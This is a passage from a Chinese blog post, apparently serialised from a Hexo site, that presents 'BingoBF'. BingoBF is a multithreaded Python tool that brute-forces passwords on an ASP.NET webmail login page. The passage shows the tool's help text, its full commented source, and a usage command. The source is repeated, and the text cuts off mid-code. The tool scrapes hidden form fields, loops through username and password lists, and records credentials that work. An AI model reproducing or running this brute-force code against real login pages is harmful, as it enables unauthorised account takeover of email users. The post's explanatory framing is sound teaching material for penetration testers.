passwords</div><div class=\"line\">  -o OUTPUT    print results to file</div><div class=\"line\">  -t THREAD    mutli threads, default 3 threads</div><div class=\"line\"></div><div class=\"line\">+---+</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"代码解释\"><a href=\"#代码解释\" class=\"headerlink\" title=\"代码解释\"></a>代码解释</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env python3</div><div class=\"line\"># -*- coding: utf-8 -*-</div><div class=\"line\"></div><div class=\"line\">import logging</div><div class=\"line\">import argparse</div><div class=\"line\">import queue</div><div class=\"line\">import requests</div><div class=\"line\">import threading</div><div class=\"line\">import os</div><div class=\"line\">import time</div><div class=\"line\">import random</div><div class=\"line\">from html.parser import HTMLParser</div><div class=\"line\">from requests.packages.urllib3.exceptions import InsecureRequestWarning</div><div class=\"line\"></div><div class=\"line\">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</div><div class=\"line\"># disable InsecureRequestWarning</div><div class=\"line\"># 由于目标站点使用的证书过期了，导致我在使用requests库请求时将verify设置为FALSE，同时配置了proxies(指向本地Burp)。而requests依赖的底层库urllib3总是报Warning，所以使用上面语句disable掉这个Warning。可以参考如下链接：</div><div class=\"line\"># https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho</div><div class=\"line\"></div><div class=\"line\">logging.basicConfig(level=logging.WARNING)       # 用logging,避免调试时满篇的print.（但本脚本中基本没怎么用。。。）</div><div class=\"line\"></div><div class=\"line\"># general settings</div><div class=\"line\"></div><div class=\"line\">target_url=&quot;https://mail.xxx.com/UserLogin.aspx&quot;</div><div class=\"line\"></div><div class=\"line\">writeFileLock = threading.Lock()    # 创建文件锁，避免写文件冲突。</div><div class=\"line\">threadLock = threading.Lock()    #创建线程锁，避免对显示效果的影响。</div><div class=\"line\"></div><div class=\"line\"># 保存爆破结果</div><div class=\"line\">def saveFile(message,outfilePath):</div><div class=\"line\">    with open(outfilePath, &apos;a+&apos;, encoding = &apos;utf8&apos;) as f:  # 以追加的方法结果写入文件</div><div class=\"line\">        f.write(message[0]+&quot;\\t&quot;)</div><div class=\"line\">        f.write(message[1]+&quot;\\n&quot;)</div><div class=\"line\"></div><div class=\"line\"># 自定义一个Exception类,用于显示自定义的异常。</div><div class=\"line\">class validcodeException(BaseException):</div><div class=\"line\">    def __init__(self,mesg=&quot; @@@@@@@@@@@@@@@         valid code is wrong!!!!!!!&quot;):</div><div class=\"line\">        print(mesg)</div><div class=\"line\"></div><div class=\"line\"># 解析响应报文，主要用户提取服务器响应回来的表单字段，顶好用的玩意儿。官方文档：https://docs.python.org/3.6/library/html.parser.html?highlight=htmlparser</div><div class=\"line\">class BruteParser(HTMLParser):</div><div class=\"line\">    def __init__(self):</div><div class=\"line\">        HTMLParser.__init__(self)</div><div class=\"line\">        self.tag_results = &#123;&#125;</div><div class=\"line\"></div><div class=\"line\">    def handle_starttag(self, tag, attrs):</div><div class=\"line\">        if tag == &quot;input&quot;:</div><div class=\"line\">            tag_name = None</div><div class=\"line\">            tag_value = None</div><div class=\"line\">            for name, value in attrs:</div><div class=\"line\">                if name == &quot;name&quot;:</div><div class=\"line\">                    tag_name = value</div><div class=\"line\">                if name == &quot;value&quot;:</div><div class=\"line\">                    tag_value = value</div><div class=\"line\">            if (tag_name == &quot;__VIEWSTATE&quot;) or (tag_name == &quot;__VIEWSTATEGENERATOR&quot;) or (tag_name == &quot;__EVENTVALIDATION&quot;):</div><div class=\"line\">                self.tag_results[tag_name] = tag_value</div><div class=\"line\"></div><div class=\"line\"># 核心实现类</div><div class=\"line\">class Bruter(object):</div><div class=\"line\">    def __init__(self, threads,userList,pwdList,outfilePath):</div><div class=\"line\">        self.user_q=userList</div><div class=\"line\">        self.pwdlist=list(pwdList.queue)      # 对于每个用户名，密码列表需要重复使用，所以不合适用队列，故而转换为list。</div><div class=\"line\">        self.threads=threads</div><div class=\"line\">        self.outfilePath=outfilePath</div><div class=\"line\">        print(&quot;Total %d(%d * %d) tries( %d threads)&quot;% (self.user_q.qsize()*len(self.pwdlist),self.user_q.qsize(),len(self.pwdlist),self.threads))</div><div class=\"line\"></div><div class=\"line\">    # 线程的创建与管理</div><div class=\"line\">    def run_bruteforce(self):</div><div class=\"line\">        thread_arr=[]       # 线程列表list</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            t = threading.Thread(target=self.web_bruter)</div><div class=\"line\">            thread_arr.append(t)            # 创建线程</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            thread_arr[i].start()           # 开启线程</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            thread_arr[i].join()            # 回归线程</div><div class=\"line\"></div><div class=\"line\">    # 核心方法</div><div class=\"line\">    def web_bruter(self):</div><div class=\"line\">        proxies = &#123; </div><div class=\"line\">            &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;, </div><div class=\"line\">            &quot;https&quot;: &quot;https://127.0.0.1:8080&quot;, </div><div class=\"line\">        &#125;       # Burpsuite的代理地址</div><div class=\"line\"></div><div class=\"line\">        # 初始化cookie以及hidden元素数据。</div><div class=\"line\">        response = requests.get(target_url,proxies=proxies,verify=False)</div><div class=\"line\">        cookie=response.cookies</div><div class=\"line\"></div><div class=\"line\">        # 解析异常表单字段</div><div class=\"line\">        parser = BruteParser()</div><div class=\"line\">        parser.feed(response.text)</div><div class=\"line\">        post_tags = parser.tag_results</div><div class=\"line\">        post_tags[&apos;cmdSubmit.x&apos;]=random.randint(1,47)       # 登录按钮图片 47x39像素</div><div class=\"line\">        post_tags[&apos;cmdSubmit.y&apos;]=random.randint(1,39)</div><div class=\"line\"></div><div class=\"line\">        # 从队列中取需要爆破的用户名，在多线程中使用queue比较方便。</div><div class=\"line\">        while not self.user_q.empty():</div><div class=\"line\">            username = self.user_q.get().rstrip().decode(&quot;ascii&quot;)</div><div class=\"line\">            for password in self.pwdlist:</div><div class=\"line\">                password=password.decode(&quot;ascii&quot;)</div><div class=\"line\">                post_tags[&quot;txtUsername&quot;]=username</div><div class=\"line\">                post_tags[&quot;txtPassword&quot;]=password</div><div class=\"line\">                </div><div class=\"line\">                threadLock.acquire()    # 取得线程锁，使用线程锁，避免出现显示效果被打乱的情况。</div><div class=\"line\">                # \\r将光标回退到行首（\\b回退一格）,实现原地覆盖。</div><div class=\"line\">                print(&quot; \\b\\b&quot;*100,end=&quot;&quot;)       # 退两格，清空一格。 实现清空。</div><div class=\"line\">                print(&quot;\\rTrying: %15s : %15s  (%d users left)&quot; % (username,password, self.user_q.qsize()),end=&quot;&quot;)</div><div class=\"line\">                #time.sleep(2)          # 调试时使用的</div><div class=\"line\">                threadLock.release()    # 释放线程锁</div><div class=\"line\">                reqResult = requests.post(target_url,data=post_tags,cookies=cookie,allow_redirects=True,proxies=proxies,verify=False)</div><div class=\"line\"></div><div class=\"line\">                if (&quot;欢迎使用XXX邮件系统&quot; in reqResult.text):   # 爆破成功</div><div class=\"line\">                    threadLock.acquire()    # 取得线程锁</div><div class=\"line\">                    print(&quot; \\b\\b&quot;*100,end=&quot;&quot;)</div><div class=\"line\">                    print (&quot;\\r[*] --&gt;  %15s\\t%15s&quot; % (username,password))   # 打印到窗口</div><div class=\"line\">                    #time.sleep(2)</div><div class=\"line\">                    threadLock.release()    # 释放线程锁</div><div class=\"line\">                    if self.outfilePath is not None:    # 输出到文件</div><div class=\"line\">                        # 获取文件锁</div><div class=\"line\">                        writeFileLock.acquire()</div><div class=\"line\">                        try:</div><div class=\"line\">                            # 追加到文件</div><div class=\"line\">                            saveFile((username,password),self.outfilePath)</div><div class=\"line\">                        finally:</div><div class=\"line\">                            # 释放锁</div><div class=\"line\">                            writeFileLock.release()</div><div class=\"line\">                    break   # 跳出当前循环，进行下一个用户名爆破</div><div class=\"line\">                if (&quot;您输入的验证码不正确，请重新输入!&quot; in reqResult.text): # 验证码错误，抛出异常！</div><div class=\"line\">                    raise validcodeException(&quot;验证码错误，需要检查代码！！！！☆☆☆☆☆☆☆&quot;)</div><div class=\"line\">                    exit    # 退出！ 理论上不会执行这一句。</div><div class=\"line\">                # 由于该登陆点存在验证码失效的问题，所以按理不会出现验证码不准确的情况，故而，也没继续完善代码。 如有需要，可自行完善。</div><div class=\"line\"></div><div class=\"line\">                if  (&quot;对不起, 您输入的用户名或口令错误, 请重新输入。&quot; in reqResult.text):</div><div class=\"line\">                    pass        # 占一个坑，没鸟用</div><div class=\"line\">                pass</div><div class=\"line\"></div><div class=\"line\">                #time.sleep(2)</div><div class=\"line\"># 读取文件，生成队列</div><div class=\"line\">def build_list(listFile):   </div><div class=\"line\">    # read in the list file</div><div class=\"line\">    fd = open(listFile, &quot;rb&quot;)</div><div class=\"line\">    raw_words = fd.readlines()</div><div class=\"line\">    fd.close()</div><div class=\"line\"></div><div class=\"line\">    words = queue.Queue()</div><div class=\"line\"></div><div class=\"line\">    for word in raw_words:</div><div class=\"line\">        word = word.rstrip()</div><div class=\"line\">        words.put(word)</div><div class=\"line\">    return words</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def main():</div><div class=\"line\">    headCharPic=&quot;\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   &lt; Author: Mr.Bingo &gt;\\n      //   \\ \\   ------------------ \\n     (|     | ) &lt;    oddboy.cn     &gt;\\n    /&apos;\\_   _/`\\  ------------------\\n    \\___)=(___/\\n&quot;</div><div class=\"line\">    print(headCharPic)</div><div class=\"line\">    # 创建一个argparser解析器</div><div class=\"line\">    parser=argparse.ArgumentParser(</div><div class=\"line\">        prog=&quot;BingoBF&quot;,</div><div class=\"line\">        usage=&quot; %(prog)s [options] &quot;,</div><div class=\"line\">        description=&apos;Brute Force 【https://mail.xxx.com] email\\&apos;s passwords.&apos;,</div><div class=\"line\">        epilog=&quot;+---+\\n&quot;</div><div class=\"line\">        )</div><div class=\"line\"></div><div class=\"line\">    groupUser = parser.add_mutually_exclusive_group(required=True)</div><div class=\"line\">    groupUser.add_argument(&apos;-u&apos;,dest=&quot;username&quot;,help=&quot;username&quot;)</div><div class=\"line\">    groupUser.add_argument(&apos;-U&apos;,dest=&apos;userList&apos;,help=&quot;usernames&quot;)</div><div class=\"line\"></div><div class=\"line\">    groupPwd = parser.add_mutually_exclusive_group(required=True)</div><div class=\"line\">    groupPwd.add_argument(&apos;-p&apos;,dest=&quot;password&quot;,help=&quot;password&quot;)</div><div class=\"line\">    groupPwd.add_argument(&apos;-P&apos;,dest=&apos;pwdList&apos;,help=&quot;passwords&quot;)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(&apos;-o&apos;,dest=&apos;output&apos;,help=&quot;print results to file&quot;)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(&quot;-t&quot;,dest=&quot;thread&quot;,type=int,help=&quot;mutli threads, default 3 threads&quot;,default=3)</div><div class=\"line\"></div><div class=\"line\">    args=parser.parse_args()    # 命令行参数解析</div><div class=\"line\">    </div><div class=\"line\">    if args.username is not None:</div><div class=\"line\">        userList=list(args.username)</div><div class=\"line\">    else:</div><div class=\"line\">        userList = build_list(args.userList)</div><div class=\"line\">    if args.password is not None:</div><div class=\"line\">        pwdList=list(args.password)</div><div class=\"line\">    else:</div><div class=\"line\">        pwdList = build_list(args.pwdList)</div><div class=\"line\"></div><div class=\"line\">    outfilePath = None</div><div class=\"line\">    if args.output is not None:</div><div class=\"line\">        outfilePath = args.output</div><div class=\"line\">        filePath,fileName=os.path.split(outfilePath)</div><div class=\"line\">        if (filePath!=&quot;&quot;) and (not os.path.exists(filePath)):</div><div class=\"line\">            os.mikedirs(filePath)   # 若不存在这个目录则递归创建</div><div class=\"line\"></div><div class=\"line\">    if args.thread is not None:</div><div class=\"line\">        user_thread=args.thread</div><div class=\"line\"></div><div class=\"line\">    bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath)</div><div class=\"line\">    bruter_obj.run_bruteforce()</div><div class=\"line\"></div><div class=\"line\">if __name__ == &apos;__main__&apos;:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>\n<h2 id=\"调用sample\"><a href=\"#调用sample\" class=\"headerlink\" title=\"调用sample\"></a>调用sample</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜ ~ python3 BingoBF.py -U user.txt -P pwd.txt -o Outfile.txt</div></pre></td></tr></table></figure>\n<h2 id=\"附赠\"><a href=\"#附赠\" class=\"headerlink\" title=\"附赠\"></a>附赠</h2><p>命令行中显示的企鹅字符画是用一个叫cowsay的工具弄的，感兴趣自己百谷。</p>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>  起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。</p>\n</blockquote>\n<h2 id=\"主要功能\"><a href=\"#主要功能\" class=\"headerlink\" title=\"主要功能\"></a>主要功能</h2><p>脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。 </p>\n<p>关于这个库的使用，可以参考我之前写过的blog：<a href=\"http://oddboy.cn/2017/06/Python-argparse模块详解/\">Python argparse模块详解</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  pythonCode python3 BingoBF.py -h</div><div class=\"line\">        .--.</div><div class=\"line\">       |o_o |    ------------------</div><div class=\"line\">       |:_/ |   &lt; Author: Mr.Bingo &gt;</div><div class=\"line\">      //   \\ \\   ------------------</div><div class=\"line\">     (|     | ) &lt;    oddboy.cn     &gt;</div><div class=\"line\">    /&apos;\\_   _/`\\  ------------------</div><div class=\"line\">    \\___)=(___/</div><div class=\"line\"></div><div class=\"line\">usage: BingoBF [options]</div><div class=\"line\"></div><div class=\"line\">Brute Force 【https://mail.xxx.com] email&apos;s passwords.</div><div class=\"line\"></div><div class=\"line\">optional arguments:</div><div class=\"line\">  -h, --help   show this help message and exit</div><div class=\"line\">  -u USERNAME  username</div><div class=\"line\">  -U USERLIST  usernames</div><div class=\"line\">  -p PASSWORD  password</div><div class=\"line\">  -P PWDLIST   passwords</div><div class=\"line\">  -o OUTPUT    print results to file</div><div class=\"line\">  -t THREAD    mutli threads, default 3 threads</div><div class=\"line\"></div><div class=\"line\">+---+</div></pre></td></tr></table></figure>","more":"<h2 id=\"代码解释\"><a href=\"#代码解释\" class=\"headerlink\" title=\"代码解释\"></a>代码解释</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env python3</div><div class=\"line\"># -*- coding: utf-8 -*-</div><div class=\"line\"></div><div class=\"line\">import logging</div><div class=\"line\">import argparse</div><div class=\"line\">import queue</div><div class=\"line\">import requests</div><div class=\"line\">import threading</div><div class=\"line\">import os</div><div class=\"line\">import time</div><div class=\"line\">import random</div><div class=\"line\">from html.parser import HTMLParser</div><div class=\"line\">from requests.packages.urllib3.exceptions import InsecureRequestWarning</div><div class=\"line\"></div><div class=\"line\">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</div><div class=\"line\"># disable InsecureRequestWarning</div><div class=\"line\"># 由于目标站点使用的证书过期了，导致我在使用requests库请求时将verify设置为FALSE，同时配置了proxies(指向本地Burp)。而requests依赖的底层库urllib3总是报Warning，所以使用上面语句disable掉这个Warning。可以参考如下链接：</div><div class=\"line\"># https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho</div><div class=\"line\"></div><div class=\"line\">logging.basicConfig(level=logging.WARNING)       # 用logging,避免调试时满篇的print.（但本脚本中基本没怎么用。。。）</div><div class=\"line\"></div><div class=\"line\"># general settings</div><div class=\"line\"></div><div class=\"line\">target_url=&quot;https://mail.xxx.com/UserLogin.aspx&quot;</div><div class=\"line\"></div><div class=\"line\">writeFileLock = threading.Lock()    # 创建文件锁，避免写文件冲突。</div><div class=\"line\">threadLock = threading.Lock()    #创建线程锁，避免对显示效果的影响。</div><div class=\"line\"></div><div class=\"line\"># 保存爆破结果</div><div class=\"line\">def saveFile(message,outfilePath):</div><div class=\"line\">    with open(outfilePath, &apos;a+&apos;, encoding = &apos;utf8&apos;) as f:  # 以追加的方法结果写入文件</div><div class=\"line\">        f.write(message[0]+&quot;\\t&quot;)</div><div class=\"line\">        f.write(message[1]+&quot;\\n&quot;)</div><div class=\"line\"></div><div class=\"line\"># 自定义一个Exception类,用于显示自定义的异常。</div><div class=\"line\">class validcodeException(BaseException):</div><div class=\"line\">    def __init__(self,mesg=&quot; @@@@@@@@@@@@@@@         valid code is wrong!!!!!!!&quot;):</div><div class=\"line\">        print(mesg)</div><div class=\"line\"></div><div class=\"line\"># 解析响应报文，主要用户提取服务器响应回来的表单字段，顶好用的玩意儿。官方文档：https://docs.python.org/3.6/library/html.parser.html?highlight=htmlparser</div><div class=\"line\">class BruteParser(HTMLParser):</div><div class=\"line\">    def __init__(self):</div><div class=\"line\">        HTMLParser.__init__(self)</div><div class=\"line\">        self.tag_results = &#123;&#125;</div><div class=\"line\"></div><div class=\"line\">    def handle_starttag(self, tag, attrs):</div><div class=\"line\">        if tag == &quot;input&quot;:</div><div class=\"line\">            tag_name = None</div><div class=\"line\">            tag_value = None</div><div class=\"line\">            for name, value in attrs:</div><div class=\"line\">                if name == &quot;name&quot;:</div><div class=\"line\">                    tag_name = value</div><div class=\"line\">                if name == &quot;value&quot;:</div><div class=\"line\">                    tag_value = value</div><div class=\"line\">            if (tag_name == &quot;__VIEWSTATE&quot;) or (tag_name == &quot;__VIEWSTATEGENERATOR&quot;) or (tag_name == &quot;__EVENTVALIDATION&quot;):</div><div class=\"line\">                self.tag_results[tag_name] = tag_value</div><div class=\"line\"></div><div class=\"line\"># 核心实现类</div><div class=\"line\">class Bruter(object):</div><div class=\"line\">    def __init__(self, threads,userList,pwdList,outfilePath):</div><div class=\"line\">        self.user_q=userList</div><div class=\"line\">        self.pwdlist=list(pwdList.queue)      # 对于每个用户名，密码列表需要重复使用，所以不合适用队列，故而转换为list。</div><div class=\"line\">        self.threads=threads</div><div class=\"line\">        self.outfilePath=outfilePath</div><div class=\"line\">        print(&quot;Total %d(%d * %d) tries( %d threads)&quot;% (self.user_q.qsize()*len(self.pwdlist),self.user_q.qsize(),len(self.pwdlist),self.threads))</div><div class=\"line\"></div><div class=\"line\">    # 线程的创建与管理</div><div class=\"line\">    def run_bruteforce(self):</div><div class=\"line\">        thread_arr=[]       # 线程列表list</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            t = threading.Thread(target=self.web_bruter)</div><div class=\"line\">            thread_arr.append(t)            # 创建线程</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            thread_arr[i].start()           # 开启线程</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            thread_arr[i].join()            # 回归线程</div><div class=\"line\"></div><div class=\"line\">    # 核心方法</div><div class=\"line\">    def web_bruter(self):</div><div class=\"line\">        proxies = &#123; </div><div class=\"line\">            &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;, </div><div class=\"line\">            &quot;https&quot;: &quot;https://127.0.0.1:8080&quot;, </div><div class=\"line\">        &#125;       # Burpsuite的代理地址</div><div class=\"line\"></div><div class=\"line\">        # 初始化cookie以及hidden元素数据。</div><div class=\"line\">        response = requests.get(target_url,proxies=proxies,verify=False)</div><div class=\"line\">        cookie=response.cookies</div><div class=\"line\"></div><div class=\"line\">        # 解析异常表单字段</div><div class=\"line\">        parser = 